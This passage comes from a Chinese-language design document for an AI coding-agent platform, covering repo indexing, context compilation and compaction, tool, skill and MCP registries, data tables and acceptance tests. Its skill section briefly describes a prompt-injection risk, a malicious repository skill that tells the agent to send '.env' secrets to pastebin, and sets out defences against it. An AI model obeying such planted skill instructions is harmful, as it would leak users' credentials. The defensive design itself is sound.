**环境镜像 → 沙箱**：`SandboxSpec.image` 直接接受 env 的镜像 digest。**接口零改动**——
这就是 M0 把 `image` 定义成"必须带 digest"的回报。

---

## D. 仓库索引与 Repo Map

### D.1 四层索引，但 M2 只做两层半

README §3.3 列了五层索引。M2 的取舍要写清楚（避免"什么都做一点、什么都不好用"）：

| 索引 | 技术 | M2 做不做 | 理由 |
|---|---|---|---|
| 符号索引 | tree-sitter | ✅ **做** | Repo Map 的输入；精确跳转的基础 |
| 全文检索 | ripgrep | ✅ **做**（**它是工具，不是索引**） | `grep` 工具直接在沙箱里跑 `rg`；不需要提前建索引。README 把它列进"索引层"是分类错误，M2 修正 |
| 仓库地图 | 符号图 + PageRank | ✅ **做**（M2 的核心） | 见 D.3；单位收益最高 |
| 依赖图 | import/call graph | ⚠️ **只做文件级** | 精确的 call graph 需要类型解析（每个语言一套，成本极高）；文件级引用图已经够 Repo Map 用 |
| 向量索引 | pgvector + embedding | ❌ **M2 不做** | 没有需求驱动，也没有评估集；连排期都不进（见 §H） |

**M2 的索引范围就是"符号 + 引用图 + Repo Map"**：这三样解决的是"agent 开局没有全局感"，
而且都是确定性、可解释、一次算好、跨 Run 复用的东西。

### D.2 索引在哪建、存在哪

```
CP 侧的 clone（repo/clone.ts 已经存在）
        │
        ▼
  index worker（CP 进程内的子进程 / worker_threads）
        │  tree-sitter 解析 → 符号 + 引用边
        ▼
  Postgres: repo_symbols / repo_refs / repo_maps
        + 大产物落对象存储（repo_index/{repo_key}/{commit}.json.gz）
```

**为什么在 CP 侧建，而不是在沙箱里建**：

1. **复用**：`(repo, commit)` 的索引跨 Run 复用——10 个任务打同一个 commit，只解析一次；
2. **不占沙箱**：索引是 CPU/内存密集的批处理，塞进沙箱会挤占 agent 的 CPU 配额（沙箱 `--cpus=1`）；
3. **不需要沙箱的隔离**：解析代码不执行代码（tree-sitter 只读 AST），没有执行任意代码的风险，
   不需要加固环境；反过来，沙箱里装 tree-sitter 原生依赖会让镜像变大且引入 node-gyp；
4. **凭据一致**：CP 已经有 clone（用 installation token），索引直接读工作区，不需要新的凭据路径。

**tree-sitter 的形态**：用 **`web-tree-sitter`（WASM）**，不用原生绑定。

- 理由：原生绑定需要 node-gyp/编译工具链，跨平台与 CI 都更脆；WASM 是纯 JS 加载，安装零编译；
- 代价：解析速度约为原生的 1/3–1/5——用**预算指标**兜住（中位仓库 ≤ 60s，见 §J），而不是先优化；
- 语法文件（.wasm）**vendored 进仓库**（`vendor/tree-sitter/*.wasm`，固定版本 + 记录 sha256）：
  安装时下载会让"能不能建索引"依赖网络，而索引是可重建的派生物，不该引入新的外部依赖。
- 支持语言（M2）：TypeScript/TSX、JavaScript、Python、Go、Rust、Java、Ruby、PHP。
  不支持的语言**降级**为"没有符号的仓库"——ripgrep 与 read 照样工作，Repo Map 退化成文件树。

### D.3 Repo Map：M2 的核心武器

**做法**（Aider 验证过的路线）：

```
① 符号提取   tree-sitter → 每个文件的定义（函数/类/方法/接口/类型/常量）与签名
② 引用边     文件 A 里出现的标识符 → 找到"定义它的文件 B" → A → B 一条边
             （同名的定义有多个时，权重按 1/N 衰减，或者直接丢弃——宁可少一条边，不要错一条边）
③ PageRank   在文件级图上跑 Personalized PageRank（damping 0.85）
             个性化向量 = 任务里提到的标识符/文件/目录名（issue 文本做一次符号匹配）
             匹配不到就退化成均匀分布（此时它回答的是"这个仓库的心脏在哪"）
④ 渲染       按排名取 top-N，画出「文件 → 签名列表」的骨架，压进 token 预算
```

**渲染长什么样**（示意）：

```
src/api/routes.ts:
│ export function createRouter(deps: Deps): Router
│ export interface RouteContext
├── src/api/handlers/billing.ts:
│   export async function createInvoice(ctx: RouteContext): Promise<Invoice>
│   export async function refundInvoice(ctx: RouteContext, id: string): Promise<Refund>
└── src/billing/ledger.ts:
    export class Ledger
    │  async post(entry: Entry): Promise<void>
    │  async balance(account: string): Promise<Money>
```

**三条设计约束**：

1. **只给签名，不给实现**——它是"地图"不是"代码"。模型看完知道该去哪，自己 `read`。
2. **预算固定**（默认 1500 tokens，上限 3000）——地图挤掉对话历史是本末倒置。
3. **确定性**：同样的 `(commit, personalization, budget)` 必须渲染出**逐字节相同**的文本。
   否则提示词缓存前缀每轮都失效（§E.5），且回放不再可比。

**索引与地图的失效策略（一个重要但不显然的点）**：

Repo Map 是从 **base commit** 建的，而 agent 在沙箱里边跑边改——地图会过期。处理方式是**显式告诉
模型**，而不是每改一个文件就重建索引：

- 每次 `edit`/`write` 的 tool result 里，工具层记录 `changedFiles`（进 `details`）；
- ContextCompiler 渲染地图时，把"本次 Run 已改动的文件"附在末尾一行：
  `# 本次 Run 已改动（地图可能过期）：src/billing/refund.ts, src/api/handlers/billing.ts`；
- 增量重建**只在**"改动文件数 > 20 或进入新 turn 且距上次重建 > 5 分钟"时触发（避免每轮重算）。

### D.4 增量更新

```
上一次索引的 commit  →  git diff --name-status old new（在 CP 的 clone 里，不需要沙箱）
   ├── 只有 M/A/D          →  只重解析变化的文件，边的两端若在变化集里则重算
   └── 非祖先 / 变化过大    →  全量重建（有明确阈值：变化 > 30% 文件）
```

- 索引键 = `(repo_key, commit_sha)`，`repo_key` = `owner/name`（不含 token）；
- 索引是**派生物**：任何时刻可以删掉重建，DB 里不存唯一真相（与 pi 对"branch index / search"的态度一致）；
- 索引完成后写 `repo_indexes` 一行（stats: 文件数、符号数、耗时、语言分布），失败也不阻塞 Run
  （只是没有地图）。

---

## E. ContextCompiler（上下文编译）

### E.1 原则：上下文是**编译**出来的，不是拼接出来的

```
              ┌─────────────────────────── 输入（有预算意识的素材） ────────────────────────┐
              │ 系统提示词  工具定义  技能清单  Repo Map  任务书  近期 entries  检索片段   │
              └───────────────────────────────┬───────────────────────────────────────────┘
                                              │ 编译：分区 → 截断 → 渲染 → 校验 → 哈希
                                              ▼
                              ┌──────────────────────────────────┐
                              │ CompiledContext                  │
                              │  sections: [{name, tokens, hash}]│
                              │  system / tools / messages       │
                              │  compiled_hash（回放与缓存用）    │
                              └──────────────────────────────────┘
```

**与 README §3.3 的一处有意修正**：README 写的是"超出预算时按优先级**驱逐**"。M2 **不做驱逐**，
只做两件事——**分区预算**（每一块有自己的上限，超了在自己内部截断）+ **compaction**（整体超窗口时
压缩最老的部分）。理由：

- 驱逐的判据（"相关性"）本身不可靠，驱逐后上下文每轮都在变，**提示词缓存前缀失效**、回放不可比；
- pi 用"分区 + 压缩"跑通了同类场景，没有引入驱逐；
- 真正需要"按相关性挑选"的部分（Repo Map 的 Personalization）已经在 §D.3 里用确定性算法处理了。

README §3.3 的预算表**保留为监控指标**（每块实际占了多少 token 要能看到），但不再是强制裁剪规则。

### E.2 分区与预算

| 区 | 内容 | 初始预算 | 变化频率 | 缓存 |
|---|---|---|---|---|
| `tools` | 工具定义（TypeBox → JSON Schema） | 固定（按工具数） | 只在 Run 开始时变 | 缓存前缀第 1 段 |
| `system` | 角色、规则、沙箱事实、技能清单 | ≤ 15% | Run 内不变 | 缓存前缀第 2 段 |
| `repo_map` | 仓库地图 | 1500 tokens（≤ 5%） | 只在 commit / 改动集变化时 | 缓存前缀第 3 段 |
| `task` | issue 原文 + 任务书 + 验收要求 | ≤ 10% | Run 内不变 | 缓存前缀第 4 段 |
| `seed` | 检索到的"该看哪几个文件"（只有路径 + 符号名，不含正文） | ≤ 3% | Run 内不变 | 跟随 task |
| `history` | 近期 entries（完整） | 剩余全部 | 每轮增长 | 不缓存（追加式） |

**为什么顺序这么排**：Anthropic 的缓存是**前缀匹配**（`tools → system → messages`），所以把所有
"Run 内不变"的东西排在前面、把"每轮增长"的 history 排在最后，就能让前缀命中率最大化。M0 的
`model.ts` 已经在 system 末尾打了 `cache_control`，M2 是把这件事**分区化管理**，而不是继续靠约定。

**预算不是配额**：`repo_map` 与 `seed` 的截断是强制的（它们会挤掉历史）；`system` 与 `task` 超了
要**报错**（说明提示词写得太长，是工程问题，不该靠截断糊过去）。

### E.3 工具结果外置（对齐 pi，不另起一套）

M0 的做法：工具结果在**工具层**截断（2000 行 / 50 KiB），大输出落沙箱日志文件，
结果里给 `log_path` 与"用 read 继续读"的提示。**这与 pi 的做法是同一个设计**（pi 是
`truncate.ts` + 临时文件 + `fullOutputPath`，我们已经有 exec 日志文件 + read 的 offset 续读）。

所以 M2 的规则是：

1. **截断只在一个地方发生**（工具层，pi 的 `truncate.ts` 同款：行数/字节数双上限，保留头或尾，
   行内截断 + 明确后缀）；
2. ContextCompiler **不再二次截断**（只做一次总长安全阀，正常永远不触发）；
3. 大结果的"完整版"必须有一个**沙箱内可读的路径**（`log_path` / 临时文件），并且结果文本里
   必须包含"怎么继续读"的指令——模型不知道"还能续读"时就只会重复跑命令。

### E.4 compaction（对齐 pi 的算法，逐条）

**触发判据**（pi 的 `shouldCompact`）：

```
contextTokens > contextWindow - reserveTokens
```

`contextTokens` 的算法照抄 pi：**取最近一次 assistant 的 usage 作为基线**（真实 token 数），
它之后的消息用 `chars/4` 估算。这比"全部用 chars/4 估"准得多，而且是免费的（usage 本来就有）。

**触发时机**：`prepareNextTurn` 钩子里（每轮工具执行完、下一轮模型调用前）。另有两个补充触发点：
- **溢出恢复**：provider 返回"超出上下文窗口"错误 → 压缩一次 → 重试本轮（只重试一次，避免死循环）；
- **手动**：CLI 的 `--compact` / UI 按钮（M3 的 `/compact` 等价物）。

**切点规则**（`findCutPoint` 的核心，也是最容易写错的地方）：

- 从最新往回累加 token，直到 `keepRecentTokens`（默认 20k）；
- 切点只能落在 **turn 边界**（user / assistant / custom message），**绝不能落在 tool_result 上**
  （tool_use 与 tool_result 必须同生共死，否则协议 400）；
- 当**单个 turn 本身就超过 `keepRecentTokens`** 时，允许切在 turn 中间的 assistant 消息上 → 这叫
  **split turn**：被切开的 turn 前半部分单独生成一份"turn prefix 摘要"，再与历史摘要合并；
- 第二次压缩时，摘要范围从**上一次压缩的 `firstKeptEntryId`** 开始（不是从压缩条目本身），
  这样"上次幸存下来的消息"这次仍会被纳入摘要——否则它们会永远卡在窗口里。

**摘要格式**（结构化，不是自由文本）：

```markdown
## Goal
## Constraints & Preferences
## Progress
### Done / ### In Progress / ### Blocked
## Key Decisions
## Next Steps
## Critical Context
<read-files>…</read-files>
<modified-files>…</modified-files>
```

- **文件清单是累积的**：分析本轮 `messagesToSummarize` 里的工具调用 + 上一份摘要的 details，
  合并去重——这样"agent 改过哪些文件"不会因为压缩而丢失；
- 摘要请求本身**关闭 prompt 缓存写入**（它是一次性请求，写缓存是浪费），并**计入 usage ledger**；
- 摘要用的模型可配置（默认与主模型相同，可用 `REUBEN_CLOUD_SUMMARY_MODEL` 换成便宜模型）；
- **工具结果在序列化进摘要请求前截断到 2000 字符**（否则摘要请求自己会超窗——这是最容易忽略的死循环）。
- 摘要消息在 `convertToLlm` 时渲染成一条**带前缀的 user 消息**（模型明确知道"这是摘要"），
  而不是伪装成新的用户指令（§B.4）。

**持久化**：压缩写一条 `CompactionEntry{summary, firstKeptEntryId, tokensBefore, usage, details}`。
**原 entries 一行不删**——压缩改变的是"送去模型的投影"，不是历史（§B.1）。

### E.5 编译产物与可回放

每轮模型调用前，落一行 `model_requests`：

| 字段 | 说明 |
|---|---|
| `session_id` / `turn` | 归属 |
| `compiled_hash` | 编译产物的 sha256（**相同输入 → 相同哈希**，用于缓存命中分析与回放比对） |
| `sections` | 每个分区的名字 / token 数 / hash（不含正文，便于查询"地图占了多大"） |
| `system` / `tools_hash` | 缓存前缀的两个关键块 |
| `messages_ref` | 完整 messages 正文：≤ 256 KiB 内联 jsonb，超出落对象存储（`requests/{session}/{turn}.json.gz`） |
| `usage_id` | 关联 usage ledger 行 |

**"一切可回放"的最终判据**：给定 `(session_id, turn)`，能从存储里**逐字节复原**模型当时看到的
每一段输入。M0 的 JSONL 已经近似做到了（每轮记 system/tools/messages），M2 把它变成**可查询的
结构化存储**，并且把 JSONL 降级为"导出格式"（`agent:run --export`）。

---

## F. Tool Registry / Skills / MCP

### F.1 单一事实来源：一个注册表，三个来源

```
                     ┌──────────────────────────────┐
                     │        ToolRegistry          │
                     │  register(source, tool)      │
                     │  select(criteria) → snapshot │
                     │  resolve(name)               │
                     └───┬──────────┬───────────┬───┘
                         │          │           │
                  builtin│   skill  │    mcp    │
                  （7 个）│（工具包） │（外部能力）│
                         └──────────┴───────────┘
                                 │
                                 ▼
                    Run 开始时的**只读快照**（冻结）
                    + addedToolNames 允许运行中追加（懒加载）
```

**为什么是"快照 + 懒加载"**：工具集合在 Run 中途变化会让缓存前缀失效、让回放不可比；但技能/MCP
又确实有"用到才加载"的价值。pi 的折中是 `addedToolNames`：工具结果可以声明"我引入了这些工具"，
从**下一条消息**起重编译上下文。这就是懒加载与确定性之间的平衡点。

### F.2 内置工具（对齐 pi 的语义）

| 工具 | 现状 | M2 目标（对齐 pi） | 执行落点 |
|---|---|---|---|
| `read` | ✅ 有（offset/limit + 续读锚点） | 加：行号前缀、目录提示（读目录时提示用 `ls`）、图片（M3） | 沙箱 `GET /files` |
| `write` | ✅ 有 | 加：写前读过的校验（可选）、目标目录不存在时的明确错误 | 沙箱 `PUT /files` |
| `edit` | ❌ 缺 | **新增**：`oldString`/`newString` 精确替换（含 replaceAll）、失败时给"最接近的一处"的 diff 提示 | 沙箱 read→apply→write |
| `grep` | ❌ 缺 | **新增**：`rg` 包装（pattern / glob / 上下文行 / 行数与字节截断） | 沙箱 `exec`（rg 打进镜像） |
| `find` | ❌ 缺 | **新增**：按 glob 找文件（`fd`/`rg --files`） | 沙箱 `exec` |
| `ls` | ⚠️ 叫 `list` | 改名为 `ls`（对齐 pi 与模型先验），保留 depth 语义 | 沙箱 `GET /files/list` |
| `bash` | ✅ 有（argv 数组） | 见下面的"有意偏差" | 沙箱 `POST /exec` + SSE |

**三处必须写清楚的取舍**：

1. **`bash` 的入参形态**。沙箱的契约是 **argv 数组、无隐式 shell**（`sandbox.md` §C.2 的红线，
   它消灭了命令拼接注入这一整类问题）。pi 的 bash 工具收的是**shell 字符串**，内部 `spawn(shell,
   ["-c", command])`。M2 的选择：**保持沙箱契约不变，让 bash 工具自己把字符串包成
   `["bash","-lc",command]`**。理由：
   - 这是**工具层的显式选择**，不是沙箱的隐式行为——红线没有破；
   - 模型在"shell 字符串"上的先验极强（所有主流 coding agent 都是这个形状），改一次能省掉大量
     失败的调用（M0 的系统提示词里专门写了一条"cmd 是 argv 数组"，那是在跟模型的先验对抗）；
   - 安全性没有实质变化：agent 本来就能在沙箱里执行任意代码，"能否用管道/重定向"不是安全边界
     （`sandbox.md` §F.5 已经把这件事说透了）。
   这条偏差**要同步改 prompt.ts 与 sandbox 文档的措辞**（见 §L）。

2. **`edit` 不是"让模型输出 diff"**。README §3.3 写的"编辑用 diff，不用全文"容易被理解成
   "模型的输出是 unified diff"——那是**更差**的设计（模型算行号与上下文极易出错，且一旦错一处
   整个 patch 报废）。正确做法就是 pi 的：模型给 `oldString → newString` 的精确片段，**工具**做
   精确匹配替换，**并且生成 diff 放 `details`**（给人看、给 PR 正文用）。省 token 的同时把
   出错面从"整个文件"缩小到"一处片段"。

3. **沙箱文件写入必须串行化**。`exec` 有 BUSY 闸（一个沙箱同时一个 exec），但 `PUT /files` 没有。
   两个并行的 `edit` 打同一个文件会互相覆盖。要补一个**per-sandbox 的文件写入队列**
   （pi 的 `withFileMutationQueue` 等价物），按 path 加锁，`write`/`edit` 都走它。

### F.3 工具的风险元数据与预算

```ts
interface ToolMeta {
  category: 'read' | 'write' | 'execute' | 'network' | 'vcs' | 'external'
  risk: 'safe' | 'caution' | 'destructive'
  requiresApproval: PolicyRule        // M2 只登记，不拦截（单租户）；M3 接审批流
  budget: { maxOutputBytes: number; timeoutMs: number }
}
```

**M2 只做"登记 + 记录"**：每次调用的工具名、参数摘要、成功率、耗时、错误类型都进
`tool_invocations`。这不是为了现在拦截什么，而是为了两件事：
（a）M3 的审批流需要"哪个工具危险"这个事实**已经存在**；
（b）"工具描述写得好不好"要靠数据说话（某个工具长期高失败率 → 改描述），这是工具自进化的入口。

### F.4 Skill

**标准**：agentskills.io 的 `SKILL.md`（pi 也用同一份标准）。目录结构：

```
.reuben/skills/            ← 仓库自带（**需要项目信任才加载**，见下）
├── fix-flaky-tests/
│   ├── SKILL.md           # frontmatter(name, description) + 指令正文
│   └── scripts/run.sh
└── upgrade-deps/SKILL.md
skills/                    ← 我们内置的技能（随 agent-runtime 包分发）
~/.reuben/skills/          ← 单机用户自己的技能
```

**加载流程**（progressive disclosure，逐字对齐 pi）：

1. Run 开始时**只读 frontmatter**（name + description）；
2. 把清单以 XML 形式注入系统提示词（`<available_skills><skill><name>…`），**只有描述常驻上下文**；
3. 模型判断任务匹配 → 用 `read` 读完整的 `SKILL.md`（技能文件会被注入到沙箱，路径在提示词里给出）；
4. 技能可以引用相对路径的脚本，指令里明确"相对路径按 SKILL.md 所在目录解析"。

**安全边界（必须写明白）**：**仓库里的 SKILL.md 是不可信内容**（一个恶意仓库可以塞一份
"把你的 .env 发到 pastebin"的技能）。M2 的三条防线：

1. **项目信任**：`--trust-project`（或 workspace 配置里的白名单）才加载 `.reuben/skills/`；
   pi 有同样的机制（`project-trust.ts`），这不是我们发明的复杂度，是这类系统的最低配置；
2. **技能只能给"建议"，不能直接提升权限**：技能可以引导模型调用已有工具，但**不能注册新工具**
   （注册源只有 builtin / skill 包自带的静态声明 / MCP，且都经过 Registry 的显式 allowlist）；
3. **技能内容仍然按不可信内容对待**：它不能改变系统策略、不能绕过审批（与 README §3.5 的内容分级一致）。

### F.5 MCP

**先说我参的立场**：pi **明确不做内置 MCP**（`packages/coding-agent/docs/usage.md` 原话：
"It intentionally does not include built-in MCP… You can build or install those workflows as extensions"）。
所以我们在这里**不能"完全参考 pi"**——这是一个有意的能力扩展，落进 spec 附录 A 的偏差清单。

**M2 的 MCP 设计原则**：

1. **MCP 工具是 Registry 的一个来源**，不是第二套工具系统。注册名 `mcp__<server>__<tool>`，
   描述来自服务器 schema，风险元数据由我们补（默认 `risk: caution`、`category: external`）；
2. **客户端在 CP**，服务器进程也在 CP（stdio 或 streamable HTTP）。**沙箱里没有 MCP**——
   这与"沙箱零凭据"是同一条红线：MCP 服务器往往需要第三方 API key；
3. **每个 server 一个工具 allowlist**（README §3.4 的原始诉求：一个 server 暴露 20 个工具，只放行 5 个）；
4. **MCP 结果是不可信内容**：进上下文前打标记（后续审批/内容分级都靠这个标记），且必须截断；
5. **不做的部分**：MCP 的 resources / prompts 协议（M2 只做 tools/list + tools/call）、
   服务器自动安装（必须由管理员显式配置）、服务器沙箱化（M2 写进风险登记）。

**为什么放在最后一个 Phase**：MCP 是 M2 五个子系统里**最不承重**的一个——它不解决"环境跑不起来"
也不解决"agent 迷路"，它是"能力扩展"。M2 的前 13 个 Phase 交付之后，MCP 可以独立进或者不进。

---

## G. 数据模型

### G.1 新增表（全部挂在已有的 Postgres 上）

```
environments          (project_key, revision) → 镜像 digest / 状态 / 缓存键 / 构建日志
env_builds            每次构建尝试一行（含自愈轮次、错误分类、耗时、usage）
repo_indexes          (repo_key, commit) → 符号数 / 语言分布 / 对象存储 key / 状态
repo_symbols          符号行（path, name, kind, signature, start/end line, lang）
repo_refs             文件级引用边（from_path, to_path, symbol, weight）
repo_maps             (repo_key, commit, personalization_hash, budget) → 渲染产物 + hash

sessions              会话（长期实体）：repo / 起点 commit / cwd / 标题 / 当前 leaf
runs                  一次执行（一个沙箱）：session_id / start_entry_id / end_entry_id / 停止原因
session_entries       会话的对话树（id, session_id, parent_id, seq, type, payload jsonb）——只追加
model_requests        每轮模型调用的编译产物（session_id + run_id + turn；正文内联或引用）
tool_invocations      工具调用的意图与结算（见 G.3）
usage_ledger          每次模型调用的用量与成本（含压缩摘要 / 环境自愈 / 技能分析）
skills / skill_runs   技能清单与每次加载记录（谁在什么任务里用了哪个技能、结果如何）
mcp_servers / mcp_calls  MCP 服务器配置与调用记录
```

**`sessions` 与 `runs` 的分工是这张表里最不能写错的一处**：entries / 用量 / 工具调用都挂
`session_id`（长期），同时带一个 `run_id` 标记"这一段是哪次执行干的"。如果反过来把 entries
挂在 Run 上，第二句话就会开一个新会话（§A.1 的那个 Bug）。

**与既有表的关系**：`sandboxes` / `executions` / `artifacts` 一行不改。新表的 `run_id` 仍是
**可空 text、无外键**（与 M0 Phase 8 同一个理由：`runs` 表是 M3 的事，现在建了就是空壳）。

### G.2 `session_entries`

| 字段 | 说明 |
|---|---|
| `id` | `ent_<ulid>`（时间有序，与既有 ID 风格一致） |
| `session_id` | 归属（**长期实体**；一个会话可以有多个 Run） |
| `parent_id` | 会话树的父指针（M2 是一条直线，但结构上支持分叉，M3 直接用） |
| `seq` | 会话内单调递增（存储分配），排序与分页都用它 |
| `type` | `message` / `compaction` / `custom`（M2 只有这三种用得上） |
| `payload` | jsonb：完整的 AgentMessage 或压缩摘要（含 `firstKeptEntryId` / `tokensBefore` / `details`） |
| `created_at` | |

**只追加，不修改，不删除**（压缩不改历史，只加一条）。唯一的例外是 M4 的合规删除，M2 不做。

**下一轮的起点 = 当前 leaf**：会话里最新的那条 entry 就是下一轮开始的地方。
`runs.start_entry_id` 记着"这一轮从哪条之后开始"，`runs.end_entry_id` 记着"结束时 leaf 在哪"——
两个字段加起来就能回答"第 2 轮看到的是第 1 轮的哪些内容"。

### G.3 `tool_invocations`：意图 → 结算

```
TX[intent]    INSERT tool_invocations(status='intent', session_id, run_id, tool, args,
                                      replay, turn, source_index, result_entry_id)
                              ↓
                        执行工具（可能耗时几分钟）
                              ↓
TX[settle]    INSERT session_entries(result_entry_id, toolResult…)
              UPDATE tool_invocations SET status='settled', ended_at, is_error, result_bytes
```

**M2 只保证"记录正确"**：崩溃后能查出"哪些调用停在 intent 状态"。
**M3 才做恢复动作**（`replay: safe` 的重放、`never` 的合成中断结果）——**M2 绝不自动重放**，
因为 Run 本身还不可恢复，自动重放只会制造更难查的重复副作用。

### G.4 索引与配置表的关系（一句话）

`environments` / `repo_indexes` / `skills` / `mcp_servers` 是**配置与派生物**，可以随时重建；
`session_entries` / `usage_ledger` / `tool_invocations` 是**记录**，只追加。两者在同一个库里，
但**恢复语义不同**：前者坏了重建，后者坏了丢证据。

---

## H. M2 不做的功能

每项都写清"什么时候才需要它"，避免它被无声地提前拉进来。

| 功能 | 为什么现在不做 | 什么时候需要 |
|---|---|---|
| **同一个 Run 崩了原地续跑**（跨进程恢复） | M2 做的"续轮"是**会话级**的（新 Run 从 entries 重建，见 §A.1），不是**执行级**的（崩了的那个 Run 原地接上）。后者要先把 operation 状态机建起来 | M3「检查点恢复」；触发点是"长任务在中途失败一次 = 几十分钟白烧" |
| **会话分叉 / 并行试两种方案** | 线性对话已经满足多轮；分叉要引入树结构、lane、结果合并与"选哪条"的产品交互 | M3 的并行 Run（README §5 已有此条） |
| **沙箱预热池 / 跨会话复用 / 快照挂起** | M2 的复用范围是"同一个会话热着的时候"；跨会话复用要预热池（引入休眠态、复用计数、消毒四套机制），快照要 microVM | 冷启动 p95 > 10s 且成为体验瓶颈时（同 `sandbox.md` §H） |
| **向量检索 / embedding 索引** | 没有需求驱动：Repo Map + grep/read 已经覆盖"找代码"；也没有评估集，上了不知道是好是坏 | 真出现"符号与全文搜不到、只能靠语义"的实测案例，且先有评估集 |
| 向量检索 / embedding 索引 | 没有评估集就无法判断它是否让 agent 更好；Repo Map + ripgrep 已经覆盖"结构 + 精确匹配" | M4 的 Eval Harness 建好之后，作为一个"必须证明有增益才上线"的进化项 |
| 多 agent / sub-agent | 先跑通单 agent；子 agent 的价值在"探索型任务的上下文隔离"，是 ContextCompiler 成熟后的优化 | 出现"探索步骤把主上下文撑爆"的实测数据时 |
| 审批流（Human-in-the-loop） | M2 是单租户、本地、受信任；先积累 `tool_invocations` 里的风险数据 | M3「审批流」；接第二个用户时 |
| Project Memory（跨会话记忆） | 需要一个"写入提取"流程 + 一个"检索注入"位置；M2 先把上下文的分区与预算做对 | M4 的 L1 记忆进化（README §3.8 排序：L1 最先做、收益最大） |
| 成本看板 / 配额 | 账本（usage ledger）M2 就位，**展示**不是 M2 的事 | M3 可观测性 |
| Trace / OTel 全链路 | 先有可回放（model_requests + entries），再有 trace；顺序反了会做出一堆没人看的 span | M3 可观测性 |
| MCP 的 resources / prompts | tools 是 90% 的用量；协议面越小越不容易做错 | 出现具体需求时 |
| 技能市场 / 技能版本管理 | 技能是文本文件，git 就是版本管理 | 需要跨组织分享技能时 |
| 环境构建的沙箱化（在一次性容器里 build） | M2 单租户受信任仓库；风险已登记（§C.7） | 接入不受信任仓库前（与 gVisor 同一道门槛） |
| Layer 1 基础镜像的完整矩阵（8+ 语言） | 先覆盖 TS/Python/Go（真实诉求最多的三个），其余按需 | 出现真实仓库需要 Rust/Java 时（矩阵扩展是纯增量） |
| 环境预热池 | 与 `sandbox.md` §H 同一个理由：冷启动还不是瓶颈 | 冷启动 p95 > 10s 且成为体验瓶颈 |
| 沙箱内编辑的实时 LSP / 类型检查 | 验证阶梯（lint/build/test）已经能给出可信信号；LSP 是"更快"，不是"更准" | 出现"agent 反复改错类型"的实测数据时 |

---

## I. 演进路线（M2 → M3 的接口）

原则：**M2 的每个子系统都留好"下一步的接缝"，但不提前实现下一步。**

```
M2 交付                      M3 接什么                              接缝在哪
────────────────────────────┬──────────────────────────────────────┬──────────────────────────
sessions + runs（长期/一次） │ 调度器 + 触发器（label/评论/cron）：    │ 会话级沙箱租约已在；
                             │ 什么时候跑、谁的消息先跑、配额与并发      │ runs.start/end_entry_id
                             │                                      │ 已是轮次边界
                             │ 沙箱预热池 / 跨会话复用 / 快照挂起        │ 租约接口不变，只换实现
session_entries（只追加）    │ 同一个 Run 的跨进程恢复（读 entries 重建）│ store 接口 + entries 完整
tool_invocations（意图/结算）│ 恢复：replay=safe 重放 / never 合成中断  │ 表结构已经在
usage_ledger                 │ 成本看板 + 配额 + 告警                  │ 每次模型调用都已记账
model_requests               │ Trace / 回放 UI                        │ 每轮编译产物已落库
ToolMeta.requiresApproval    │ 审批流：挂起等人工确认                   │ 风险元数据已登记
environments + 健康检查       │ 环境自进化：构建失败的自愈结果固化回项目级│ revision + promote 接口
skills + tool_invocations    │ 工具描述优化（用失败率数据驱动）          │ 调用统计已落库
ContextCompiler 的分区        │ Project Memory 注入（多一个分区）        │ 分区是可插拔的
Repo Map                     │ 影响面分析（"改了 A 会碰谁"）等分析类功能 │ 符号 + 引用边已经在表里
```

**一个反向约束**：M3 的每一项都**不允许**要求 M2 的子系统变形（比如为了恢复把 entries 改成可变）。
如果不改就做不了，说明 M2 的接缝选错了，先改 M2 的设计文档再动 M3。

---

## J. 验收标准

### J.1 功能闭环（M2 唯一的硬指标）

给定**三个真实但不预置环境的仓库**（一个 Node/TS 单包、一个 Python 项目、一个 monorepo）：

1. **环境**：`agent:run --repo <url>` 不需要任何手工准备 → 10 分钟内得到环境状态
   （`ready` / `degraded` / `failed` 三选一，附构建日志与健康检查结果）；
2. **推断分级**：三个仓库分别命中 L1（devcontainer）/ L2（Dockerfile）/ L3（信号 + LLM），
   每条路径都验证过；
3. **自愈**：人为让第一次生成的 Dockerfile 少一个依赖 → 自愈循环在 ≤ 3 轮内修好并记录全部尝试；
4. **Repo Map**：`ready` 之后第一轮模型调用里就有仓库地图，**地图里包含 issue 涉及的模块**
   （用结构化断言：地图文本里出现了期望的文件路径）；
5. **上下文**：一个刻意超长的会话（累计 > 窗口）能自动压缩并**继续完成**任务，压缩前后都能
   从存储里复原"模型看到了什么"；
6. **工具**：7 个内置工具按 pi 的语义工作（含 `edit` 的精确替换、`grep/find` 的截断与续读提示、
   `bash` 的流式输出与取消）；
7. **技能**：一个自带 `.reuben/skills/make-release/SKILL.md` 的仓库，模型在该任务里**确实加载了它**
   （`skill_runs` 有记录）并按技能指令执行；
8. **MCP**：一个 stdio MCP server（比如官方的 filesystem / memory server）的 5 个工具里只放行 2 个，
   模型能调用它们，未放行的工具**在工具列表里根本不存在**；
9. **多轮会话与沙箱复用**：一个会话里 20 句纯讨论 → **容器创建次数 = 0**；
   接着"开始改"→ 改 → 看 diff → 再改」十几句 → **容器创建次数 = 1**（断言 `sandboxes` 只有一行）；
   上下文里有前面所有句子的历史（必要时含压缩摘要）；空闲回收后下一句 → 新建 1 个沙箱、
   工作区从任务分支恢复（不是从原始 base commit）；一次执行中插入的 steering 消息
   不会开新 Run、也不会丢。

### J.2 上下文质量（比"能不能跑"更难，必须量化）

| 指标 | 目标 | 怎么测 |
|---|---|---|
| token 估算误差 | 与 provider 报的 usage 误差 < 15% | 用 20 次真实调用的 `estimateContextTokens` vs `usage.input_tokens` 对比 |
| 压缩触发准确 | 100% 在"窗口 - reserve"之上触发，且不早于窗口的 70% | 单测 + 一次长会话集成测试 |
| 压缩后任务连续性 | 压缩前后 agent 不重复已完成的工作（人工判定 + 结构化断言：摘要里的 Done 与后续工具调用不重合） | 3 个真实长任务 |
| 缓存前缀命中率 | 同一 Run 内，除首轮外每轮都应命中缓存（`cache_read_input_tokens > 0`） | usage ledger |
| Repo Map 收益 | 有地图的 Run 比无地图的 Run **平均工具调用轮数下降 ≥ 20%** | 同一批 5 个任务的对照（无地图 = 关掉地图分区） |

**最后一条是唯一能证明"上下文管理值得做"的证据**。如果实测没有下降，`repo_map` 分区就要被质疑——
这也是为什么它必须先写清度量方式，而不是先写一堆渲染代码。

### J.3 红线（一条都不能破）

- [ ] **沙箱内仍然零凭据**：环境构建的 token、模型 key、MCP 凭据全部只在 CP；
      `env` / 全盘搜索 / `.git/config` 里都找不到（沿用 M0 冒烟脚本的检查）；
- [ ] **构建阶段不注入任何凭据**：`docker build` 的进程 env 与 `--build-arg` 里没有 token；
